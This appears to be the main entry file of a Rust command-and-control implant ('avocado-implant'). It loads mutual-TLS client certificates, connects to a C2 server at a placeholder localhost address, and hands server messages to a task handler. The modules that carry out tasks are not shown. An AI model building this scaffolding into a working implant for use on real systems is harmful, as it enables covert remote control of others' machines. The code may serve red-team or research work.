use std::sync::mpsc;
use std::thread;

mod mtls;
mod pb;
mod tasks;
mod handler;


fn main() {
    // TODO: embed the client certs at compile time
    let root_ca = "../certs/server/rootCA.pem";
    let client_pem = "../certs/client/avocado-implant.c2-client.pem";
    let client_key = "../certs/client/avocado-implant.c2-client-key.pem";
    let config = mtls::client_config(root_ca, client_pem, client_key).unwrap();

    // TODO: Change the server address and name at compile time
    let addr = "127.0.0.1:31337".parse().unwrap();
    let server = mtls::Server::new(addr, "avocado-server.c2").unwrap();

    // Create two channels for bidirectional communicate with the handler.
    let (read_tx, read_rx) = mpsc::channel();
    let (write_tx, write_rx) = mpsc::channel();

    // Start the mtls session
    let mut client = mtls::Client::new(config, server).unwrap();
    let session_thread = thread::spawn(move || {
        client.session(write_rx, read_tx);
    });

    // Start processing messages from the server
    handler::Handler::new(read_rx, write_tx).start();
    session_thread.join().unwrap();
}
